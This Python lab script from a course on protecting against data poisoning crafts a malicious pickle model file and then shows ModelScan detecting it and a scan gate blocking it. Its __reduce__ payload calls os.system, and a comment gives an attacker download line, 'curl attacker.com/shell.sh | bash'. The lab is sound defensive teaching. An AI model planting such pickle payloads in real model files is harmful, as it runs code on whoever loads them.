"""
Lab 7.1 — ModelScan for Malicious Model Detection
Data Poisoning Protection Course

This script walks through five steps:
  1. Craft a malicious pickle-based model file
  2. Scan it with ModelScan — expect CRITICAL finding
  3. Create and scan a clean PyTorch model — expect SAFE
  4. Export to SafeTensors and scan — expect SAFE
  5. Demo a CI/CD scan gate that blocks malicious models before torch.load()

Run with:  python lab_7_1_modelscan.py
"""

import os
import sys
import json
import pickle
import subprocess
import tempfile
from pathlib import Path

import torch
import torch.nn as nn
from safetensors.torch import save_file as safetensors_save_file
from safetensors.torch import load_file as safetensors_load_file

# ---------------------------------------------------------------------------
# Custom exception for the security gate (Step 5)
# ---------------------------------------------------------------------------

class SecurityError(Exception):
    """Raised when a model file fails a security scan."""
    pass


# ---------------------------------------------------------------------------
# Helper — run ModelScan via subprocess and return parsed output
# ---------------------------------------------------------------------------

def run_modelscan(model_path: str) -> dict:
    """
    Invoke ModelScan on *model_path* via subprocess.

    ModelScan is called with --json so we can parse the result
    programmatically.  Falls back to plain-text parsing if --json
    is not available in the installed version.

    Returns a dict:
        {
            "safe":     bool,
            "findings": list[dict],   # each has "severity", "description", "source"
            "raw":      str,          # full stdout
            "returncode": int
        }
    """
    model_path = str(model_path)

    # Try JSON output first (ModelScan >= 0.5)
    try:
        result = subprocess.run(
            ["modelscan", "--json", "-p", model_path],
            capture_output=True,
            text=True,
            timeout=60,
        )
        json_output = result.stdout.strip()
        # ModelScan emits JSON to stdout when --json flag is used
        if json_output.startswith("{") or json_output.startswith("["):
            data = json.loads(json_output)
            # Normalise — some versions wrap in {"summary": ..., "issues": [...]}
            if isinstance(data, dict):
                issues = data.get("issues", data.get("findings", []))
            else:
                issues = data if isinstance(data, list) else []

            findings = []
            for issue in issues:
                findings.append({
                    "severity":    issue.get("severity", "UNKNOWN"),
                    "description": issue.get("description", str(issue)),
                    "source":      issue.get("source", model_path),
                })
            is_safe = len(findings) == 0
            return {
                "safe":       is_safe,
                "findings":   findings,
                "raw":        result.stdout,
                "returncode": result.returncode,
            }
    except (json.JSONDecodeError, FileNotFoundError):
        pass

    # Fallback — plain text scan (no --json flag)
    try:
        result = subprocess.run(
            ["modelscan", "-p", model_path],
            capture_output=True,
            text=True,
            timeout=60,
        )
    except FileNotFoundError:
        print("[ERROR] 'modelscan' command not found. Install it with: pip install modelscan")
        sys.exit(1)

    stdout = result.stdout + result.stderr
    raw    = stdout.strip()

    # Heuristic parsing of plain-text output
    findings = []
    is_safe  = True

    lines = raw.splitlines()
    for line in lines:
        upper = line.upper()
        if any(sev in upper for sev in ("CRITICAL", "HIGH", "MEDIUM", "LOW")):
            # Determine severity
            severity = "UNKNOWN"
            for sev in ("CRITICAL", "HIGH", "MEDIUM", "LOW"):
                if sev in upper:
                    severity = sev
                    break
            findings.append({
                "severity":    severity,
                "description": line.strip(),
                "source":      model_path,
            })
            is_safe = False

    # If ModelScan printed "No issues found" or similar, treat as safe
    if "no issues" in raw.lower() or "no dangerous" in raw.lower():
        is_safe   = True
        findings  = []

    return {
        "safe":       is_safe,
        "findings":   findings,
        "raw":        raw,
        "returncode": result.returncode,
    }


def print_scan_result(result: dict, label: str) -> None:
    """Pretty-print a scan result dict."""
    status = "SAFE" if result["safe"] else "UNSAFE"
    bar    = "=" * 60
    print(f"\n{bar}")
    print(f"  ModelScan Result for: {label}")
    print(f"  Status: {status}")
    print(bar)
    if result["findings"]:
        print(f"  Findings ({len(result['findings'])}):")
        for i, f in enumerate(result["findings"], 1):
            print(f"    [{i}] Severity   : {f['severity']}")
            print(f"        Description: {f['description']}")
            print(f"        Source     : {f['source']}")
    else:
        print("  No dangerous operators or payloads found.")
    print(f"{bar}\n")


# ===========================================================================
# STEP 1 — Create a malicious pickle model file
# ===========================================================================

def step1_create_malicious_model(output_path: str = "malicious_model.pkl") -> str:
    """
    Craft a malicious_model.pkl that exploits pickle deserialization.

    When Python calls pickle.load() on this file, __reduce__ is invoked
    automatically, which triggers os.system() and runs an arbitrary shell
    command.  This is a textbook supply-chain attack vector.

    NOTE: We write the file but DO NOT call pickle.load() on it ourselves
    in this lab.  ModelScan will inspect the opcodes without triggering
    execution.
    """
    print("\n" + "#" * 60)
    print("# STEP 1 — Crafting malicious_model.pkl")
    print("#" * 60)

    # --- Define the malicious payload class ---
    class MaliciousPayload:
        """
        This class abuses pickle's __reduce__ protocol.

        __reduce__ must return a (callable, args) tuple.
        Pickle will call callable(*args) during deserialization.
        Here we return os.system with a shell command as the argument —
        so any process that loads this file executes the command with
        its own privileges.
        """
        def __reduce__(self):
            # The command writes a marker file to /tmp to prove execution.
            # In a real attack this could be: curl attacker.com/shell.sh | bash
            cmd = "echo 'PWNED: malicious code executed' > /tmp/pwned.txt"
            return (os.system, (cmd,))

    # Wrap payload in a dict that looks like a legitimate model state_dict
    fake_model_bundle = {
        "model_state": MaliciousPayload(),
        "epoch":       42,
        "accuracy":    0.9987,   # convincing-looking metadata
    }

    # Serialize to disk
    with open(output_path, "wb") as f:
        pickle.dump(fake_model_bundle, f)

    file_size = Path(output_path).stat().st_size
    print(f"[+] Malicious model written to: {output_path} ({file_size} bytes)")
    print(    "    The file contains a MaliciousPayload object whose __reduce__")
    print(    "    method returns (os.system, ('echo PWNED > /tmp/pwned.txt',)).")
    print(    "    Any process calling pickle.load() on this file will execute")
    print(    "    that OS command automatically — no user interaction required.")
    print(    "    The file looks like an ordinary model checkpoint from the outside.")

    return output_path


# ===========================================================================
# STEP 2 — Scan malicious_model.pkl with ModelScan
# ===========================================================================

def step2_scan_malicious_model(model_path: str = "malicious_model.pkl") -> None:
    """
    Run ModelScan against the malicious pickle file.

    ModelScan reads the pickle byte stream and identifies opcodes that
    reference dangerous callables (os.system, subprocess.Popen, exec, eval,
    __import__, etc.) without ever deserializing the object.

    Expected result: CRITICAL severity finding.
    """
    print("\n" + "#" * 60)
    print("# STEP 2 — Scanning malicious_model.pkl with ModelScan")
    print("#" * 60)
    print(f"[*] Running: modelscan -p {model_path}")
    print(    "[*] ModelScan reads pickle opcodes WITHOUT executing them.")

    result = run_modelscan(model_path)
    print_scan_result(result, model_path)

    if not result["safe"]:
        print("[+] EXPECTED: ModelScan flagged the file as UNSAFE.")
        print("    A CRITICAL/HIGH finding means a dangerous callable was found")
        print("    in the pickle opcode stream. The model must NOT be loaded.\n")
    else:
        # This should not happen, but handle gracefully
        print("[!] WARNING: ModelScan did not flag the file.")
        print("    Check that your modelscan version supports pickle scanning.")
        print("    Raw output below:")
        print(result["raw"])


# ===========================================================================
# STEP 3 — Create and scan a clean PyTorch model (.pt)
# ===========================================================================

def step3_create_and_scan_clean_pytorch(output_path: str = "clean_model.pt") -> str:
    """
    Build a simple two-layer MLP, save it with torch.save(), then scan it.

    torch.save() uses pickle internally, but the pickle opcodes reference
    only safe PyTorch tensor/storage classes — no system calls.
    ModelScan should report SAFE.
    """
    print("\n" + "#" * 60)
    print("# STEP 3 — Creating and scanning a clean PyTorch model (.pt)")
    print("#" * 60)

    # --- Build a minimal MLP ---
    # Input: 128 features -> Hidden: 64 -> Output: 10 classes
    model = nn.Sequential(
        nn.Linear(128, 64),
        nn.ReLU(),
        nn.Linear(64, 10),
    )
    model.eval()

    # Save using torch.save (pickle-based format)
    torch.save(model.state_dict(), output_path)

    file_size = Path(output_path).stat().st_size
    print(f"[+] Clean PyTorch model saved to: {output_path} ({file_size} bytes)")
    print(    "    Architecture: Linear(128->64) -> ReLU -> Linear(64->10)")
    print(    "    Format: torch.save() — uses pickle internally, but only")
    print(    "    references safe PyTorch tensor/storage classes.\n")

    # --- Scan with ModelScan ---
    print(f"[*] Running: modelscan -p {output_path}")
    result = run_modelscan(output_path)
    print_scan_result(result, output_path)

    if result["safe"]:
        print("[+] EXPECTED: ModelScan reports SAFE for clean_model.pt.")
        print("    The pickle opcodes contain only PyTorch tensor references.")
        print("    No dangerous operators (os.system, exec, eval, etc.) present.\n")
    else:
        print("[!] UNEXPECTED: Clean model flagged. Review findings above.")

    return output_path


# ===========================================================================
# STEP 4 — Convert to SafeTensors and scan
# ===========================================================================

def step4_convert_to_safetensors_and_scan(
    pt_path:           str = "clean_model.pt",
    safetensors_path:  str = "clean_model.safetensors",
) -> str:
    """
    Load the clean model's state dict, export to SafeTensors format, scan it.

    SafeTensors stores only raw tensor data with a JSON header — there are
    zero pickle opcodes.  It is immune to deserialization exploits by design.
    ModelScan should report SAFE with no findings.
    """
    print("\n" + "#" * 60)
    print("# STEP 4 — Converting to SafeTensors and scanning")
    print("#" * 60)

    # Load state dict from the clean .pt file
    # weights_only=True is best practice — restricts unpickling to tensors only
    state_dict = torch.load(pt_path, weights_only=True)

    # safetensors_save_file expects a flat dict of str -> torch.Tensor
    # Ensure all values are tensors (they should be for a state_dict)
    tensor_dict = {k: v for k, v in state_dict.items() if isinstance(v, torch.Tensor)}

    safetensors_save_file(tensor_dict, safetensors_path)

    file_size = Path(safetensors_path).stat().st_size
    print(f"[+] SafeTensors file saved to: {safetensors_path} ({file_size} bytes)")
    print(    "    SafeTensors format stores raw tensor bytes + a JSON header.")
    print(    "    There are NO pickle opcodes — deserialization exploits are")
    print(    "    impossible because no arbitrary code is ever evaluated.\n")

    # Demonstrate that the data is identical after round-trip
    loaded_back = safetensors_load_file(safetensors_path)
    keys_match   = set(tensor_dict.keys()) == set(loaded_back.keys())
    print(f"    Round-trip verification — keys match: {keys_match}")

    # --- Scan with ModelScan ---
    print(f"\n[*] Running: modelscan -p {safetensors_path}")
    result = run_modelscan(safetensors_path)
    print_scan_result(result, safetensors_path)

    if result["safe"]:
        print("[+] EXPECTED: ModelScan reports SAFE for SafeTensors file.")
        print("    No pickle opcodes exist to analyse — the format is safe by design.\n")
    else:
        print("[!] UNEXPECTED: SafeTensors file flagged. Review findings above.")

    return safetensors_path


# ===========================================================================
# STEP 5 — CI/CD scan gate
# ===========================================================================

def scan_before_load(model_path: str) -> nn.Module:
    """
    CI/CD scan gate: scan a model file before allowing torch.load().

    This function is designed to be dropped into any ML inference or
    training pipeline as a mandatory security checkpoint.

    Behaviour:
      - Runs ModelScan on *model_path*.
      - If any CRITICAL or HIGH findings are present, raises SecurityError.
        The model is NEVER loaded.
      - If the scan passes (SAFE or only LOW/MEDIUM), proceeds to torch.load().
      - Returns the loaded state dict on success.

    In production you would integrate this into your model registry download
    flow, your GitHub Actions workflow (see ci_scan_gate.py), or your
    Kubernetes init container.
    """
    print(f"\n[GATE] Scanning {model_path} before loading ...")

    result = run_modelscan(model_path)

    # Check for blocking severity levels
    blocking_severities = {"CRITICAL", "HIGH"}
    blocking_findings   = [
        f for f in result["findings"]
        if f["severity"].upper() in blocking_severities
    ]

    if blocking_findings:
        # Build a human-readable summary for the exception message
        summary_lines = []
        for f in blocking_findings:
            summary_lines.append(
                f"  [{f['severity']}] {f['description']} (source: {f['source']})"
            )
        summary = "\n".join(summary_lines)
        raise SecurityError(
            f"Model file '{model_path}' failed security scan.\n"
            f"Blocking findings:\n{summary}\n"
            f"The model was NOT loaded."
        )

    # Scan passed — safe to load
    print(f"[GATE] Scan PASSED for {model_path}. Proceeding to torch.load().")

    # Use weights_only=True for additional safety at the torch level
    # This restricts pickle to only reconstruct tensor/storage objects
    try:
        state_dict = torch.load(model_path, weights_only=True)
        return state_dict
    except Exception as e:
        # SafeTensors or other non-pickle formats won't work with torch.load
        # In a real pipeline you'd dispatch to the right loader by extension
        print(f"[GATE] torch.load failed (may be non-pickle format): {e}")
        return None


def step5_demo_cicd_gate(
    malicious_path: str = "malicious_model.pkl",
    clean_path:     str = "clean_model.pt",
) -> None:
    """
    Demonstrate the scan_before_load() gate in action.

    Shows two scenarios:
      A) Malicious model  -> SecurityError raised, model never loaded
      B) Clean model      -> Scan passes, model loaded successfully
    """
    print("\n" + "#" * 60)
    print("# STEP 5 — CI/CD Scan Gate Demo")
    print("#" * 60)
    print(    "  The scan_before_load() function enforces a mandatory ModelScan")
    print(    "  check before any torch.load() call is allowed.  This is the")
    print(    "  pattern you would use in a model-serving API, training script,")
    print(    "  or deployment pipeline.\n")

    # --- Scenario A: Block the malicious model ---
    print("--- Scenario A: Attempting to load malicious_model.pkl ---")
    try:
        scan_before_load(malicious_path)
        print("[!] BUG: Gate should have blocked this model!")
    except SecurityError as e:
        print(f"\n[BLOCKED] SecurityError raised as expected:")
        print(f"  {e}")
        print(  "\n[+] The malicious model was NEVER passed to torch.load().")
        print(  "    The attack payload did not execute.\n")

    # --- Scenario B: Allow the clean model ---
    print("--- Scenario B: Attempting to load clean_model.pt ---")
    try:
        state_dict = scan_before_load(clean_path)
        if state_dict is not None:
            param_count = sum(p.numel() for p in state_dict.values())
            print(f"\n[ALLOWED] Model loaded successfully.")
            print(f"  State dict keys : {list(state_dict.keys())}")
            print(f"  Total parameters: {param_count:,}")
        else:
            print("[ALLOWED] Gate passed (state dict not returned — non-pickle format).")
    except SecurityError as e:
        print(f"[!] UNEXPECTED block: {e}")

    print("\n" + "#" * 60)
    print("# Lab 7.1 Complete")
    print("#" * 60)
    print("\nFiles created in the current directory:")
    for fname in ["malicious_model.pkl", "clean_model.pt", "clean_model.safetensors"]:
        p = Path(fname)
        if p.exists():
            print(f"  {fname} ({p.stat().st_size} bytes)")
    print("\nKey takeaways:")
    print("  1. Pickle deserialization executes arbitrary code — never load untrusted .pkl files.")
    print("  2. ModelScan detects dangerous operators WITHOUT triggering them.")
    print("  3. SafeTensors eliminates pickle entirely — prefer it for model distribution.")
    print("  4. A scan gate (scan_before_load) enforces fail-closed security at load time.")


# ===========================================================================
# Main
# ===========================================================================

if __name__ == "__main__":
    print("=" * 60)
    print("  Lab 7.1 — ModelScan for Malicious Model Detection")
    print("  Data Poisoning Protection Course")
    print("=" * 60)

    # Run all five steps in sequence
    malicious_pkl  = step1_create_malicious_model("malicious_model.pkl")
    step2_scan_malicious_model(malicious_pkl)

    clean_pt       = step3_create_and_scan_clean_pytorch("clean_model.pt")
    safe_tensors   = step4_convert_to_safetensors_and_scan(clean_pt, "clean_model.safetensors")

    step5_demo_cicd_gate(malicious_pkl, clean_pt)
